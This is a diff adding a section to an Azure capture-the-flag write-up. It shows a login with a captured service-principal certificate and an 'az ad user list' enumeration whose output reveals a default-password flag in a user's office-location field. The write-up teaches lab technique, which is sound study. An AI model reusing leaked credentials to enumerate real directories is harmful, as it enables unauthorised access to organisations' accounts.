@@ -139,7 +139,7 @@ App-id: b2bfb506-aead-40d8-9e93-6f3e5d752826
 -----END AZURE_DETAILS-----
 ```
 
-## Writing to .pem file and az login
+## Writing to .pem file and az ad commands
 Now that I have the *certificate*, *private key*, *tenant id and *app-id*, I can use az login to access the service principal, but without the subscription (It should be noted that tenant id and app id is usually not in .pem files)
 
 ```bash
@@ -165,6 +165,78 @@ az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 44
   }
 ]
 ```
+
+When running the user list command, I find a list of AD users
+```bash
+az ad user list
+```
+
+
+### Output:
+```bash
+┌──┌──(brokenazure㉿ctf)
+└─$ az ad user list
+[
+  {
+    "businessPhones": [],
+    "displayName": "DevOps",
+    "givenName": null,
+    "id": "fd871932-d592-4791-989b-53dd81f8c9e5",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": "Password temp changed to SECURA{D4F4ULT_P4SSW0RD}",
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "devops@secvulnapp.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "roy.stultiens@azuredevsecura.onmicrosoft.com Stultiens",
+    "givenName": "roy.stultiens@azuredevsecura.onmicrosoft.com",
+    "id": "c76d2c74-8bee-4d73-8e81-a24549bafe85",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": "Stultiens",
+    "userPrincipalName": "roy.stultiens_azuredevsecura.onmicrosoft.com#EXT#@secvulnapp.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "Roy Stultiens",
+    "givenName": null,
+    "id": "41cfff23-c2c2-49c2-a8a9-abc0642dc8c5",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "roy@secvulnapp.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "Siebren",
+    "givenName": null,
+    "id": "16998a3a-15cf-4970-b86a-29922e2559df",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "siebren@secvulnapp.onmicrosoft.com"
+  }
+]
+```
+I found the second flag in `officeLocation` in the user `DevOps`:
+
+**2nd Flag: SECURA{D4F4ULT_P4SSW0RD}**
+<br>
+<br>
+<br>
 
 ## Conclusion
 The challenge underscored the critical need for securing Azure storage accounts and containers against unauthorized access. The successful enumeration and extraction of data from inadequately secured containers highlighted potential vulnerabilities, reinforcing the importance of ethical hacking practices and proper authorization prior to conducting vulnerability assessments.
